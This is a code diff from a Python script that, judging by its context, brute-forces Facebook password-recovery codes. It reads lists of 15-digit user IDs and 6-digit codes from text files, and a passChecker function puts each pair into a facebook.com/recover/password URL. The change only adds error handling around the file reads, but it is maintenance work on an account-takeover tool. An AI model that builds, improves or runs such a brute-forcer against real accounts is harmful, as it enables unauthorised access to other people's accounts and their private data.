@@ -26,22 +26,30 @@ def pf(s):
         fob.close()
 
 pf("Loading...")
-with open("uid.txt", 'r') as fob:
-    uids = fob.readlines()
-    uids = [i[:15] for i in uids]
-    pf("Number of ID's found: %i."%len(uids))
-    fob.close()
-
+try:
+    with open("uid.txt", 'r') as fob:
+        uids = fob.readlines()
+        uids = [i[:15] for i in uids]
+        pf("Number of ID's found: %i."%len(uids))
+        fob.close()
+except:
+    uids = []
+    with open("uid.txt", 'w') as fob: fob.close()
+        
 with open("c.txt", 'r') as fob:
     cs = fob.readlines()
     cs = [i[:6] for i in cs]
     fob.close()
 
-with open("d.txt", 'r') as fob:
-    ds = fob.readlines()
-    ds = [i[:6] for i in ds]
-    fob.close()
-
+try:
+    with open("d.txt", 'r') as fob:
+        ds = fob.readlines()
+        ds = [i[:6] for i in ds]
+        fob.close()
+except:
+    ds = []
+    with open("d.txt", 'w') as fob: fob.close()
+        
 def passChecker(uid, c):
     global uids
     url = "https://www.facebook.com/recover/password/?u={0}&n={1}&fl=default_recover&sih=0".format(uid,c)
